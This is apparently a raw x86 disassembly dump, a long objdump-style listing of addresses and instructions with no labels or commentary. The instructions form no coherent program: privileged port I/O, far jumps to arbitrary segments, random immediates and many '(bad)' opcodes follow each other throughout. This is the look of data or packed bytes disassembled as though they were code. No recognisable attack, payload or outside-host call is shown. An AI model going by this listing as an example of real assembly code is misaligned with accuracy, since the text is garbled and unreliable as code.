  41de0e:	retf   0xfb4
  41de11:	cmp    eax,0xa86dbdd3
  41de17:	cmc    
  41de18:	xor    edx,DWORD PTR [eax+esi*2]
  41de1b:	jmp    0xd006:0xd83719c4
  41de22:	out    dx,eax
  41de23:	test   DWORD PTR [ebx],ebp
  41de25:	das    
  41de26:	in     al,dx
  41de27:	xor    eax,0xed2943ca
  41de2c:	leave  
  41de2d:	out    0x80,al
  41de2f:	cdq    
  41de30:	jb     0x41de86
  41de32:	mov    ds:0xde6f1223,eax
  41de37:	out    dx,al
  41de38:	xlat   BYTE PTR ds:[ebx]
  41de39:	scas   al,BYTE PTR es:[edi]
  41de3a:	gs rep stos DWORD PTR es:[edi],eax
  41de3d:	fisubr DWORD PTR [ebp+0x953168f]
  41de43:	test   al,0xfa
  41de45:	xor    BYTE PTR [ecx],0x26
  41de48:	pop    ebp
  41de49:	xchg   edx,eax
  41de4a:	mov    dh,0x95
  41de4c:	mov    al,0xba
  41de4e:	mov    al,0xc8
  41de50:	xchg   esp,eax
  41de51:	loopne 0x41deb4
  41de53:	cmpxchg ah,bl
  41de56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41de57:	cdq    
  41de58:	loopne 0x41de6f
  41de5a:	inc    eax
  41de5b:	and    DWORD PTR ss:[eax-0x4e],edi
  41de5f:	leave  
  41de60:	xlat   BYTE PTR ds:[ebx]
  41de61:	(bad)  
  41de62:	ds fwait
  41de64:	cmp    esp,edx
  41de66:	sbb    al,0xe7
  41de68:	sbb    ebx,ebp
  41de6a:	mov    DWORD PTR [eax+0x23213e14],eax
  41de70:	pop    esi
  41de71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41de72:	mov    edx,0x9d86ee86
  41de77:	je     0x41dea3
  41de79:	or     ah,al
  41de7b:	xlat   BYTE PTR ds:[ebx]
  41de7c:	push   DWORD PTR [esi+0x5a]
  41de7f:	push   cs
  41de80:	(bad)  
  41de81:	out    0xa,al
  41de83:	push   ds
  41de84:	jg     0x41deeb
  41de86:	shr    DWORD PTR [edx],cl
  41de88:	mov    bl,BYTE PTR [edx+0x59]
  41de8b:	es mov ebp,0xaab9b79d
  41de91:	scas   eax,DWORD PTR es:[edi]
  41de92:	push   esp
  41de93:	cdq    
  41de94:	add    ecx,0x63
  41de97:	mov    ds:0x3bdcc980,eax
  41de9c:	push   edx
  41de9d:	pop    eax
  41de9e:	xchg   edx,eax
  41de9f:	pop    edx
  41dea0:	(bad)  [esi-0x70]
  41dea3:	xchg   DWORD PTR [ebp+0x45258e49],ebp
  41dea9:	imul   ebp,DWORD PTR [esp+eax*8-0x56fda4b4],0xa
  41deb1:	int3   
  41deb2:	aas    
  41deb3:	(bad)  
  41deb4:	jns    0x41deb6
  41deb6:	push   esp
  41deb7:	xor    eax,0xd2e2bf6
  41debc:	fnstenv [edi+0x764f7d4c]
  41dec2:	aas    
  41dec3:	lahf   
  41dec4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dec5:	sub    bh,al
  41dec7:	sub    BYTE PTR [esi+0x509f74c5],ch
  41decd:	push   0xe2d89bcf
  41ded2:	std    
  41ded3:	ds lahf 
  41ded5:	inc    ebx
  41ded6:	xchg   esi,eax
  41ded7:	hlt    
  41ded8:	cdq    
  41ded9:	sub    BYTE PTR [edi],cl
  41dedb:	xchg   edx,eax
  41dedc:	or     cl,BYTE PTR [edi]
  41dede:	scas   eax,DWORD PTR es:[edi]
  41dedf:	outs   dx,BYTE PTR gs:[esi]
  41dee1:	inc    ecx
  41dee2:	ja     0x41de97
  41dee4:	int3   
  41dee5:	sbb    DWORD PTR [eax-0x74],ebp
  41dee8:	mov    edi,0xfa8819b
  41deed:	fs shl ebx,0x8c
  41def1:	repnz ins DWORD PTR es:[edi],dx
  41def3:	push   esi
  41def4:	fild   QWORD PTR [edi+0x59]
  41def7:	push   0xfffffff8
  41def9:	dec    ebx
  41defa:	popa   
  41defb:	ror    DWORD PTR [ecx-0x3021c6e],cl
  41df01:	pusha  
  41df02:	daa    
  41df03:	pop    ebp
  41df04:	(bad)
  41df07:	lock xchg ecx,eax
  41df09:	stos   BYTE PTR es:[edi],al
  41df0a:	and    al,0x4e
  41df0c:	(bad)  
  41df0d:	jbe    0x41df40
  41df0f:	ror    BYTE PTR [esp+edx*2-0x19],1
  41df13:	pushf  
  41df14:	dec    esp
  41df15:	mov    esi,0x32273af1
  41df1a:	std    
  41df1b:	sti    
  41df1c:	jmp    0x20b6:0x24ea1a3e
  41df23:	mov    al,ds:0xbf52b2d5
  41df28:	add    ch,dl
  41df2a:	out    0x5b,al
  41df2c:	(bad)
  41df2f:	sti    
  41df30:	xchg   DWORD PTR [ebp-0x5f],edx
  41df33:	addr16 xchg esp,eax
  41df35:	push   edi
  41df36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df37:	jecxz  0x41df35
  41df39:	outs   dx,BYTE PTR ds:[esi]
  41df3a:	jmp    0x12c75d57
  41df3f:	pusha  
  41df40:	mov    ah,0xe
  41df42:	psubsw mm3,QWORD PTR [esp+edx*8]
  41df46:	mov    bl,0x60
  41df48:	ins    DWORD PTR es:[edi],dx
  41df49:	lahf   
  41df4a:	leave  
  41df4b:	jg     0x41df4d
  41df4d:	jge    0x41df24
  41df4f:	fs pop ecx
  41df51:	mov    edx,0x175a8c8c
  41df56:	rcr    BYTE PTR [eax-0x2a4daebe],cl
  41df5c:	stc    
  41df5d:	pushf  
  41df5e:	jle    0x41def5
  41df60:	push   edx
  41df61:	scas   al,BYTE PTR es:[edi]
  41df62:	xor    al,0xd8
  41df64:	pop    ecx
  41df65:	sub    DWORD PTR [ebp-0x723898c6],eax
  41df6b:	mov    esi,0x279c93b8
  41df70:	pushf  
  41df71:	mov    ebp,esp
  41df73:	adc    eax,edx
  41df75:	inc    esi
  41df76:	push   edi
  41df77:	mov    dl,0x7e
  41df79:	and    BYTE PTR [esi+0x3867e5ad],dl
  41df7f:	stc    
  41df80:	push   esi
  41df81:	scas   al,BYTE PTR es:[edi]
  41df82:	jnp    0x41dfaa
  41df84:	hlt    
  41df85:	adc    DWORD PTR [eax-0x3729bbab],0x37
  41df8c:	bound  ecx,QWORD PTR [ebx+0x638e1c1]
  41df92:	mov    esp,0xf7dfdb0a
  41df97:	data16 popw es
  41df9a:	js     0x41df4d
  41df9c:	sub    ch,ah
  41df9e:	push   eax
  41df9f:	std    
  41dfa0:	jmp    0xaa42:0xa4ac9f42
  41dfa7:	call   0x459203c0
  41dfac:	fcomp  QWORD PTR [eax-0x7f]
  41dfaf:	dec    esp
  41dfb0:	or     al,0x70
  41dfb2:	icebp  
  41dfb3:	jge    0x41e017
  41dfb5:	xchg   esi,eax
  41dfb6:	inc    ecx
  41dfb7:	and    ecx,edi
  41dfb9:	adc    DWORD PTR [ebx],edi
  41dfbb:	push   edi
  41dfbc:	push   0x1bf4e50d
  41dfc1:	xchg   edi,eax
  41dfc2:	loope  0x41dfa0
  41dfc4:	(bad)  
  41dfc5:	or     eax,0x45d54f2
  41dfca:	fisttp WORD PTR [edi]
  41dfcc:	xchg   ebx,eax
  41dfcd:	xlat   BYTE PTR ds:[ebx]
  41dfce:	(bad)  
  41dfcf:	les    esi,FWORD PTR [ebx+edx*1]
  41dfd2:	test   ecx,esp
  41dfd4:	mov    bl,0x9f
  41dfd6:	fwait
  41dfd7:	mov    esi,0xcfb147c8
  41dfdc:	pusha  
  41dfdd:	and    eax,0x88c4ba2b
  41dfe2:	sbb    eax,0x991afe37
  41dfe7:	push   es
  41dfe8:	call   FWORD PTR [eax]
  41dfea:	out    0x42,eax
  41dfec:	aas    
  41dfed:	repnz rcl BYTE PTR [ebx-0x7d15e72f],cl
  41dff4:	(bad)
  41dff8:	shl    bl,1
  41dffa:	imul   ebx,DWORD PTR [ebx-0x4],0x89664e97
  41e001:	mov    bh,0xc6
  41e003:	aad    0x91
  41e005:	test   ebp,0x3367d9b2
  41e00b:	mov    ebx,0xba8a3e81
  41e010:	mov    edx,0x38174896
  41e015:	rcl    DWORD PTR [ebx],0xd0
  41e018:	aad    0x10
  41e01a:	mov    al,BYTE PTR ds:0x9d2f4066
  41e020:	push   esi
  41e021:	mov    ds:0xfe65b718,al
  41e026:	add    DWORD PTR ds:[esi],edx
  41e029:	and    ebx,DWORD PTR [edi+0x7b19d1ed]
  41e02f:	rcl    DWORD PTR [ebx+0x3c4e4856],cl
  41e035:	data16 jbe 0x41dffb
  41e038:	imul   eax,DWORD PTR [eax-0x6e],0xffffff8e
  41e03c:	add    cl,BYTE PTR [esi-0x3e]
  41e03f:	adc    ah,bh
  41e041:	neg    BYTE PTR [ebp+0x7]
  41e044:	mov    ch,0x75
  41e046:	mov    al,ds:0x7f9738b5
  41e04b:	mov    bh,0x48
  41e04d:	in     al,0x68
  41e04f:	mov    eax,ds:0xfa653811
  41e054:	push   cs
  41e055:	int    0x52
  41e057:	loop   0x41e0bf
  41e059:	mov    edi,0x560a069f
  41e05e:	mov    al,BYTE PTR [edi]
  41e060:	mov    edi,DWORD PTR [ebx-0x66]
  41e063:	mov    es,WORD PTR [edx-0x7ba9eb61]
  41e069:	enter  0x9197,0xba
  41e06d:	xor    al,0x84
  41e06f:	aam    0xf0
  41e071:	inc    edi
  41e072:	leave  
  41e073:	out    0x91,al
  41e075:	lock sub ah,BYTE PTR [esp+ebx*1+0x42bbbe39]
  41e07d:	aas    
  41e07e:	ret    
  41e07f:	dec    edi
  41e080:	pop    eax
  41e081:	add    ah,BYTE PTR [edx-0x5d124b46]
  41e087:	out    dx,al
  41e088:	cmp    BYTE PTR [ecx+0x45baf867],0xc3
  41e08f:	pop    ss
  41e090:	mov    gs,WORD PTR [edx-0xe]
  41e093:	idiv   DWORD PTR [ebp-0x3b]
  41e096:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e097:	out    0xc0,al
  41e099:	cmp    eax,0xa62bf9d9
  41e09e:	stos   DWORD PTR es:[edi],eax
  41e09f:	call   0xcced:0xa145fc86
  41e0a6:	xor    al,BYTE PTR [edx-0x55fd6d4f]
  41e0ac:	ja     0x41e103
  41e0ae:	add    BYTE PTR [edx+ecx*2],dh
  41e0b1:	xlat   BYTE PTR ds:[ebx]
  41e0b2:	sub    eax,0xcd2365e0
  41e0b7:	jl     0x41e07f
  41e0b9:	xchg   edi,eax
  41e0ba:	mov    esp,0x5db283a9
  41e0bf:	fimul  DWORD PTR [edx]
  41e0c1:	outs   dx,BYTE PTR ds:[esi]
  41e0c2:	inc    esi
  41e0c3:	or     ah,BYTE PTR [ebx-0x30950470]
  41e0c9:	xchg   edx,eax
  41e0ca:	jne    0x41e0b1
  41e0cc:	or     ebp,DWORD PTR [ecx+ecx*1+0x6a5650d1]
  41e0d3:	cmp    DWORD PTR [esi+0x4fde6c96],esp
  41e0d9:	or     dh,BYTE PTR [ebx-0x77eb08cb]
  41e0df:	mov    esp,DWORD PTR [edx+0x57]
  41e0e2:	arpl   WORD PTR [edx+0x15],bx
  41e0e5:	inc    ebp
  41e0e6:	sub    al,0x91
  41e0e8:	cs in  eax,dx
  41e0ea:	jmp    0x278d8ac3
  41e0ef:	leave  
  41e0f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e0f1:	retf   
  41e0f2:	shl    DWORD PTR [edi],0xd9
  41e0f5:	imul   esp,DWORD PTR [ebp+0x6c],0x61c58827
  41e0fc:	mul    BYTE PTR [esi-0x54d8a6f8]
  41e102:	stos   BYTE PTR es:[edi],al
  41e103:	out    0xd0,al
  41e105:	jnp    0x41e095
  41e107:	pop    ebx
  41e108:	mov    ch,0x68
  41e10a:	loope  0x41e104
  41e10c:	fidiv  DWORD PTR [edx]
  41e10e:	sbb    BYTE PTR [ebp-0x1985d1e],cl
  41e114:	or     al,0x12
  41e116:	jecxz  0x41e0f5
  41e118:	clc    
  41e119:	pop    ebp
  41e11a:	add    DWORD PTR [ebp+0x6f],ecx
  41e11d:	adc    eax,0x32369edf
  41e122:	jbe    0x41e17d
  41e124:	xchg   ecx,eax
  41e125:	popa   
  41e126:	js     0x41e137
  41e128:	cmc    
  41e129:	sbb    bl,BYTE PTR [ebx]
  41e12b:	jo     0x41e100
  41e12d:	mov    al,ds:0x96fa9d45
  41e132:	or     al,0xb3
  41e134:	ins    DWORD PTR es:[edi],dx
  41e135:	shr    DWORD PTR [ecx-0x7e7fe6f4],cl
  41e13b:	ins    BYTE PTR es:[edi],dx
  41e13c:	data16 js 0x41e171
  41e13f:	jmp    0xc285:0xa37f395
  41e146:	icebp  
  41e147:	retf   0xb339
  41e14a:	mov    cl,0x7
  41e14c:	push   eax
  41e14d:	arpl   WORD PTR [ecx-0x228447ac],si
  41e153:	pop    esp
  41e154:	or     DWORD PTR [ecx-0x4105f238],ebx
  41e15a:	inc    eax
  41e15b:	fadd   DWORD PTR [esi+0xc5d403e]
  41e161:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e162:	sbb    ecx,DWORD PTR [edx-0x6c]
  41e165:	and    al,0xfe
  41e167:	xchg   BYTE PTR [eax+0x0],dh
  41e16a:	mov    dl,0x9e
  41e16c:	mov    al,ds:0x44c0fc64
  41e171:	shl    BYTE PTR [ebx+0x8],0x83
  41e175:	inc    esp
  41e176:	fs pop edi
  41e178:	lods   al,BYTE PTR ds:[esi]
  41e179:	cmp    bl,BYTE PTR [esi-0x79]
  41e17c:	add    bh,0x2f
  41e17f:	iret   
  41e180:	cmp    al,0x69
  41e182:	cld    
  41e183:	(bad)  
  41e184:	push   0x599abaa
  41e189:	bound  edx,QWORD PTR [ebp+0x44a48b00]
  41e18f:	mov    ch,0xe8
  41e191:	mov    ds:0x546233f5,eax
  41e196:	push   ds
  41e197:	xchg   ebx,eax
  41e198:	mov    edx,0x61b763d4
  41e19d:	pop    eax
  41e19e:	clc    
  41e19f:	mov    al,0x60
  41e1a1:	xchg   esp,eax
  41e1a2:	(bad)  
  41e1a3:	cwde   
  41e1a4:	outs   dx,BYTE PTR ds:[esi]
  41e1a5:	xor    al,0x8e
  41e1a7:	jge    0x41e170
  41e1a9:	fdiv   st,st(5)
  41e1ab:	pusha  
  41e1ac:	stos   DWORD PTR es:[edi],eax
  41e1ad:	lds    edx,FWORD PTR [eax-0x6c]
  41e1b0:	fwait
  41e1b1:	add    eax,0x2031efab
  41e1b6:	jl     0x41e234
  41e1b8:	cmp    BYTE PTR [eax],bl
  41e1ba:	mov    esi,0x255ce369
  41e1bf:	nop
  41e1c0:	adc    cl,BYTE PTR [ebx+0x107dd7e]
  41e1c6:	jb     0x41e150
  41e1c8:	mov    cl,0x60
  41e1ca:	adc    BYTE PTR [eax+ebx*4-0x3f5821db],cl
  41e1d1:	jmp    0x41e183
  41e1d3:	iret   
  41e1d4:	pop    ebx
  41e1d5:	cmc    
  41e1d6:	pop    ebp
  41e1d7:	mov    ecx,0xcb4bcb00
  41e1dc:	(bad)  [esi+eiz*4+0x45]
  41e1e0:	xchg   esi,eax
  41e1e1:	pop    ss
  41e1e2:	push   0x4b0a86e0
  41e1e7:	aad    0x77
  41e1e9:	ja     0x41e17d
  41e1eb:	xor    DWORD PTR [ebx],edi
  41e1ed:	sub    ecx,esi
  41e1ef:	pop    ebx
  41e1f0:	in     al,dx
  41e1f1:	jp     0x41e1f9
  41e1f3:	xchg   BYTE PTR [ecx+0x4670628d],dl
  41e1f9:	push   eax
  41e1fa:	push   ecx
  41e1fc:	lods   eax,DWORD PTR ds:[esi]
  41e1fd:	sti    
  41e1fe:	jle    0x41e206
  41e200:	sub    ebx,DWORD PTR [ebx]
  41e202:	mov    cl,0x2d
  41e204:	pop    ebp
  41e205:	popf   
  41e206:	out    dx,eax
  41e207:	les    esi,FWORD PTR [edi+0x58]
  41e20a:	pop    es
  41e20b:	pop    es
  41e20c:	pop    eax
  41e20d:	inc    eax
  41e20e:	stc    
  41e20f:	add    ecx,esp
  41e211:	sti    
  41e212:	cli    
  41e213:	sbb    eax,0xbf1232d4
  41e218:	ror    BYTE PTR [ebp-0x64],1
  41e21b:	fwait
  41e21c:	pop    ss
  41e21d:	(bad)  
  41e21e:	aas    
  41e21f:	fistp  WORD PTR [ebx+0x4f3a3ad]
  41e225:	sub    al,0x83
  41e227:	mov    edx,0x70147ed8
  41e22c:	fsub   QWORD PTR [eax+0x3b]
  41e22f:	ins    DWORD PTR es:[edi],dx
  41e230:	sub    eax,0x1f2afa6
  41e235:	push   ecx
  41e236:	test   BYTE PTR [ebp+0x1adb7734],dl
  41e23c:	inc    edi
  41e23d:	mov    edi,0x1e12ed50
  41e242:	push   ebp
  41e243:	cmp    al,0x6a
  41e245:	pushf  
  41e246:	ret    0xbf4d
  41e249:	jno    0x41e214
  41e24b:	dec    ecx
  41e24c:	jmp    FWORD PTR [ebx+0x348edae9]
  41e252:	in     al,0xd3
  41e254:	ja     0x41e2a6
  41e256:	aas    
  41e257:	out    dx,al
  41e258:	push   0x50
  41e25a:	mov    ch,0x93
  41e25c:	sub    eax,0xe9bbdd6c
  41e261:	jb     0x41e2d1
  41e263:	les    eax,FWORD PTR [ecx-0x45]
  41e266:	xchg   esp,eax
  41e267:	js     0x41e26f
  41e269:	mov    al,0xbc
  41e26b:	push   es
  41e26c:	xor    BYTE PTR [ebp+0x54],al
  41e26f:	or     DWORD PTR [esi+0x45],eax
  41e272:	hlt    
  41e273:	pop    ss
  41e274:	ror    BYTE PTR [edx],1
  41e276:	xchg   esi,eax
  41e277:	mov    ebp,0x42f85a62
  41e27c:	aas    
  41e27d:	sbb    bh,BYTE PTR [edi+0xaf3b7c0]
  41e283:	jg     0x41e21f
  41e285:	out    0xfe,eax
  41e287:	push   esp
  41e288:	or     eax,0xcbcffa51
  41e28d:	out    0x32,al
  41e28f:	push   edx
  41e290:	in     eax,0xdf
  41e292:	popf   
  41e293:	adc    cl,BYTE PTR [edx+0x2df482ad]
  41e299:	push   cs
  41e29a:	sbb    edi,ecx
  41e29c:	add    eax,0x45d24907
  41e2a1:	and    eax,0x9746898a
  41e2a6:	daa    
  41e2a7:	mov    al,ds:0x5eb484b7
  41e2ac:	xor    DWORD PTR [esi],0xffffff99
  41e2af:	aad    0xb8
  41e2b1:	icebp  
  41e2b2:	(bad)  
  41e2b3:	mov    ah,0xb5
  41e2b5:	ja     0x41e237
  41e2b7:	repnz enter 0x3ff8,0x62
  41e2bc:	scas   al,BYTE PTR es:[edi]
  41e2bd:	adc    ah,bl
  41e2bf:	sahf   
  41e2c0:	cmp    eax,edx
  41e2c2:	imul   esp,DWORD PTR [eax-0x68],0x47
  41e2c6:	loopne 0x41e33d
  41e2c8:	mov    edi,0xd8708200
  41e2cd:	fs push ss
  41e2cf:	add    WORD PTR [esp+ebp*2],bp
  41e2d3:	into   
  41e2d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e2d5:	jl     0x41e2fe
  41e2d7:	call   0x2a48368a
  41e2dc:	cmp    al,0x20
  41e2de:	mov    ah,0xf1
  41e2e0:	sahf   
  41e2e1:	inc    esp
  41e2e2:	add    eax,0xf136ccb
  41e2e7:	sbb    ecx,esp
  41e2e9:	sub    edi,esi
  41e2eb:	push   ds
  41e2ec:	push   ecx
  41e2ed:	loop   0x41e292
  41e2ef:	sbb    eax,esi
  41e2f1:	ret    0x6950
  41e2f4:	out    0x44,eax
  41e2f6:	fsub   DWORD PTR [ecx-0x63872c83]
  41e2fc:	pop    ebx
  41e2fd:	shl    cl,cl
  41e2ff:	js     0x41e2cb
  41e301:	adc    ah,BYTE PTR [ebp-0x776db636]
  41e307:	std    
  41e308:	push   esi
  41e309:	pushf  
  41e30a:	jmp    0xf197ce38
  41e30f:	sub    DWORD PTR [esi-0x3f],esp
  41e312:	xchg   ebx,eax
  41e313:	pop    ds
  41e314:	dec    edx
  41e315:	jge    0x41e362
  41e317:	loopne 0x41e2f6
  41e319:	mov    dl,0x52
  41e31b:	mov    dh,0x81
  41e31d:	aaa    
  41e31e:	xchg   esp,eax
  41e31f:	jbe    0x41e2e2
  41e321:	out    dx,eax
  41e322:	mov    ch,BYTE PTR [edi]
  41e324:	pusha  
  41e325:	push   esp
  41e326:	(bad)  
  41e327:	sti    
  41e328:	jb     0x41e37c
  41e32a:	and    eax,0xfd9c7b65
  41e32f:	jb     0x41e36a
  41e331:	in     eax,0x35
  41e333:	push   es
  41e334:	mov    dh,0x2
  41e336:	mov    ds:0x149e69a8,al
  41e33b:	xor    ah,BYTE PTR [edx-0x8565eb5]
  41e341:	(bad)  [edx+0x42]
  41e344:	mov    ebp,DWORD PTR [esi+0x44]
  41e347:	repnz and al,0xbc
  41e34a:	mov    eax,0xdb6ed43
  41e34f:	jne    0x41e379
  41e351:	dec    eax
  41e352:	mov    al,0x91
  41e354:	(bad)  
  41e355:	fnsave [ebx]
  41e357:	fcom   DWORD PTR [eax+0x54]
  41e35a:	sub    al,0x67
  41e35c:	dec    esi
  41e35d:	mov    eax,ds:0xe44f9611
  41e362:	sub    al,0xe8
  41e364:	jno    0x41e2f3
  41e366:	lahf   
  41e367:	scas   eax,DWORD PTR es:[edi]
  41e368:	push   eax
  41e369:	pop    ebx
  41e36a:	mov    BYTE PTR [ecx-0x7c],ch
  41e36d:	or     DWORD PTR [esi-0x3e164cd8],ebp
  41e373:	cmp    DWORD PTR [eax],0x764df62f
  41e379:	dec    eax
  41e37a:	out    0x82,al
  41e37c:	inc    esi
  41e37d:	imul   edx,DWORD PTR [esi],0x6249c449
  41e383:	xor    DWORD PTR [eax-0x15],esp
  41e386:	out    dx,eax
  41e387:	aad    0xe0
  41e389:	(bad)  
  41e38a:	lock mov BYTE PTR ds:0x86fcb3c4,ah
  41e391:	pop    edi
  41e392:	xchg   esp,ebx
  41e394:	sbb    ebp,DWORD PTR [ebp+ebx*4+0x574e0248]
  41e39b:	push   edx
  41e39c:	and    DWORD PTR [edi],ebx
  41e39e:	push   es
  41e39f:	cmp    eax,0xf4322467
  41e3a4:	shr    BYTE PTR [ebp-0x7a],cl
  41e3a7:	fwait
  41e3a8:	mov    al,ds:0x90770fe
  41e3ad:	inc    ecx
  41e3ae:	fwait
  41e3af:	and    ebp,DWORD PTR fs:[ebp+0x66]
  41e3b3:	stc    
  41e3b4:	ss mov ebx,0x97014669
  41e3ba:	jb     0x41e3ca
  41e3bc:	or     al,BYTE PTR [edi]
  41e3be:	jg     0x41e381
  41e3c0:	mov    dh,0x63
  41e3c2:	or     BYTE PTR [ecx-0x21a1ec63],al
  41e3c8:	cmp    al,0x42
  41e3ca:	inc    ecx
  41e3cb:	addr16 cdq 
  41e3cd:	or     ebp,DWORD PTR [edx+0x5f134da6]
  41e3d3:	sub    eax,0x9fb59c38
  41e3d8:	ficom  DWORD PTR [eiz*4-0x5570e772]
  41e3df:	ffree  st(6)
  41e3e1:	out    dx,eax
  41e3e2:	fs loope 0x41e3d9
  41e3e5:	jae    0x41e3ac
  41e3e7:	lods   eax,DWORD PTR ds:[esi]
  41e3e8:	(bad)  
  41e3ea:	jo     0x41e458
  41e3ec:	les    esi,FWORD PTR [esi]
  41e3ee:	adc    eax,0xe265eefb
  41e3f3:	pop    esi
  41e3f4:	or     DWORD PTR [ebx+0x10e2022f],ecx
  41e3fa:	(bad)  
  41e3fb:	push   ds
  41e3fc:	jmp    0xceefbb5d
  41e401:	test   DWORD PTR [esi+eax*2+0x3d],ecx
  41e405:	int    0xf1
  41e407:	je     0x41e3d0
  41e409:	int3   
  41e40a:	jae    0x41e42d
  41e40c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e40d:	sbb    al,0xa5
  41e40f:	retf   
  41e410:	sub    edx,DWORD PTR [ecx-0x56235968]
  41e416:	retf   
  41e417:	das    
  41e418:	out    dx,al
  41e419:	retf   0xa573
  41e41c:	sub    ebx,DWORD PTR [eax]
  41e41e:	xor    edx,edx
  41e420:	(bad)  
  41e421:	(bad)  [edx+0x32]
  41e424:	mov    ebp,0x5fd8483f
  41e429:	pop    eax
  41e42a:	addr16 cwde 
  41e42c:	dec    edi
  41e42d:	inc    ebp
  41e42e:	ror    ecx,cl
  41e430:	pop    ebp
  41e431:	scas   eax,DWORD PTR es:[edi]
  41e432:	(bad)  
  41e433:	imul   BYTE PTR [ebx+0x2ce3cc2f]
  41e439:	bound  esi,QWORD PTR [edx*8+0x4805518a]
  41e440:	cwde   
  41e441:	xor    esp,DWORD PTR [edx+ebx*4-0x586a0071]
  41e448:	push   edi
  41e449:	and    dh,cl
  41e44b:	mov    ah,0x23
  41e44d:	sub    ebx,ebp
  41e44f:	in     eax,0x9a
  41e451:	cmp    eax,0x51b7d634
  41e456:	test   DWORD PTR [eax+0x5af10cfc],eax
  41e45c:	jle    0x41e49b
  41e45e:	cmp    bh,ch
  41e460:	cs (bad) 
  41e463:	add    ebx,edx
  41e465:	mov    ss:0x7c7f8843,eax
  41e46b:	ffreep st(2)
  41e46d:	scas   al,BYTE PTR es:[edi]
  41e46e:	jbe    0x2399bc8f
  41e474:	or     ah,BYTE PTR [edx]
  41e476:	pop    ebx
  41e477:	fdivr  st(5),st
  41e479:	fistp  QWORD PTR [ebp+edx*4-0x61]
  41e47d:	xlat   BYTE PTR ds:[ebx]
  41e47e:	sahf   
  41e47f:	jae    0x41e4e2
  41e481:	pop    edi
  41e482:	jg     0x41e4b3
  41e484:	mov    eax,ds:0x248a6c82
  41e489:	fbld   TBYTE PTR [eax]
  41e48b:	or     al,0x9a
  41e48d:	adc    al,0x67
  41e48f:	cwde   
  41e490:	cmp    DWORD PTR [ebx],edx
  41e492:	mov    dh,0x49
  41e494:	idiv   BYTE PTR [edx-0xc425bbe]
  41e49a:	mov    bl,0x1f
  41e49c:	and    BYTE PTR [esi-0x5502a027],bh
  41e4a2:	mov    al,ds:0x561a4f7b
  41e4a7:	por    mm7,QWORD PTR [edi+0x468a30d0]
  41e4ae:	or     ebp,DWORD PTR [ebp+0x6b]
  41e4b1:	sahf   
  41e4b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e4b3:	call   0xc9359613
  41e4b8:	mov    es,WORD PTR [eax+0x6e]
  41e4bb:	xlat   BYTE PTR ds:[ebx]
  41e4bc:	shl    DWORD PTR [edx],cl
  41e4be:	ja     0x41e4c9
  41e4c0:	pop    esp
  41e4c1:	sbb    DWORD PTR [esp+ebp*1+0x1e415d3],ebx
  41e4c8:	pop    ebx
  41e4c9:	stc    
  41e4ca:	(bad)  
  41e4cb:	xor    al,0x73
  41e4cd:	push   es
  41e4ce:	cmp    esi,0x4c001925
  41e4d4:	inc    ecx
  41e4d5:	ss xchg esi,eax
  41e4d7:	ficom  WORD PTR [esp+eiz*8]
  41e4da:	pop    ebp
  41e4db:	xchg   DWORD PTR [eax],ebp
  41e4dd:	out    dx,eax
  41e4de:	xor    eax,0x7390b883
  41e4e3:	xchg   ecx,edx
  41e4e5:	cmp    BYTE PTR [edx],cl
  41e4e7:	scas   eax,DWORD PTR es:[edi]
  41e4e8:	and    esi,ecx
  41e4ea:	mov    ebx,0xd4ca6765
  41e4ef:	pop    esi
  41e4f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e4f1:	pop    ecx
  41e4f2:	out    dx,eax
  41e4f3:	es inc eax
  41e4f5:	push   ecx
  41e4f6:	push   esi
  41e4f7:	cmp    dl,bl
  41e4f9:	gs popf 
  41e4fb:	out    0x57,al
  41e4fd:	adc    BYTE PTR [esi+0x39],cl
  41e500:	cmp    dh,BYTE PTR ds:[ebx+0x4b]
  41e504:	fnstenv [ebx]
  41e506:	repnz popf 
  41e508:	mov    dl,0x90
  41e50a:	xchg   edi,eax
  41e50b:	addr16 xchg ecx,eax
  41e50d:	sbb    BYTE PTR [esi-0x564502a5],0x3d
  41e514:	test   eax,0x7bab410
  41e519:	push   edx
  41e51a:	or     DWORD PTR [ecx+0x7f],ecx
  41e51d:	js     0x41e505
  41e51f:	sti    
  41e520:	jp     0x41e4fa
  41e522:	in     eax,dx
  41e523:	mov    WORD PTR [edi],cs
  41e525:	pop    es
  41e526:	pop    es
  41e527:	outs   dx,BYTE PTR ds:[esi]
  41e528:	inc    edi
  41e529:	push   ecx
  41e52a:	pop    ss
  41e52b:	cwde   
  41e52c:	lds    ebx,FWORD PTR [ebx]
  41e52e:	mov    cl,0x10
  41e530:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e531:	in     al,dx
  41e532:	jle    0x41e510
  41e534:	repnz sub DWORD PTR [eax],0xa6a0d454
  41e53b:	sbb    edi,DWORD PTR [edi-0x17]
  41e53e:	mov    edx,DWORD PTR [ebp+0x62]
  41e541:	pop    ebp
  41e542:	sti    
  41e543:	lds    ebp,FWORD PTR [ecx-0x4b]
  41e546:	es jae 0x41e5bb
  41e549:	push   edi
  41e54a:	xor    al,0xba
  41e54c:	lds    eax,FWORD PTR [esi+0x1]
  41e54f:	jno    0x41e5c5
  41e551:	push   ecx
  41e552:	jecxz  0x41e588
  41e554:	jecxz  0x41e5be
  41e556:	call   0xf3f7:0xc8856eaa
  41e55d:	jae    0x41e587
  41e55f:	adc    edx,DWORD PTR [ecx]
  41e561:	inc    edi
  41e562:	call   0x486c:0xc08bc4e0
  41e569:	aad    0x97
  41e56b:	stos   BYTE PTR es:[edi],al
  41e56c:	lock fild WORD PTR [ebx]
  41e56f:	pop    edx
  41e570:	outs   dx,BYTE PTR ds:[esi]
  41e571:	shr    DWORD PTR [esi],cl
  41e573:	repnz mov ds:0x773e971b,al
  41e579:	sbb    eax,0x14690dee
  41e57e:	popf   
  41e57f:	mov    eax,ds:0x74288e69
  41e584:	ins    DWORD PTR es:[edi],dx
  41e585:	stc    
  41e586:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
